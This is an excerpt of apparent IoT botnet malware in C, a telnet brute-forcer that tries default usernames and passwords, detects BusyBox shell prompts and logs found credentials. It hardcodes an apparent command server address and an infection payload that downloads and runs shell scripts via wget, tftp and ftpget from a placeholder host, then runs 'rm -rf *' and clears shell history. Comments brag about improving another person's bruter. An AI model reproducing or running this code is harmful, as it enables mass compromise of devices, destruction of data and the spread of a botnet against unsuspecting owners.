...
system("Looping Payload Function");
...
unsigned char *hekkertelnet[] = { "89.34.99.74:562" };
//only using 3 usernames because THEYRE THE MOST EFFICENT AND INFECTABLE
char *usernames[] = {
"telnet\0",
"root\0",
"root\0"
...
"123\0"
"1234\0"
};//please put your own payload my dude
char *hvgsgd = "cd /tmp || cd /var/; wget http://x.x.x.x/cunty.sh; chmod 777 cunty.sh; sh cunty.sh; tftp x.x.x.x -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g x.x.x.x; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 x.x.x.x ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c\r\n";
char* SGSGWUD[] = {":", "ogin", "sername", "assword", (char*)0};//SGSGWUD so if it says any of the following itll try a passwd or user
char* fails[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", (char*)0};// ill kms if i see this
char* KGSVYGXA[] = {"BusyBox", "$", "#", (char*)0};//if it sees this itll send the payload
...
//took dans shitty bruter turned it into A Master piece
void StartTheLelz()
{
int i, res, j;
...
struct telstate_t fds[maxfds];
memset(fds, 0, maxfds * (sizeof(int) + 1));
for(i = 0; i < maxfds; i++)
{
...
{
HackerPrint(D1ckSucka, "LOGIN FOUND - %s:%s:%s", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
fds[i].state = 7;
}
}
else
...
HackerPrint(D1ckSucka, "\x1b[0;37m[\x1b[0;32mBUILD\x1b[0;37m] [\x1b[0;32m%s\x1b[0;37m] [\x1b[0;32m%s\x1b[0;37m] [\x1b[0;32m%s\x1b[0;37m]", inet_ntoa(ourIP), getBuild(), VERSION);
char commBuf[4096];
int got = 0;
int i = 0;
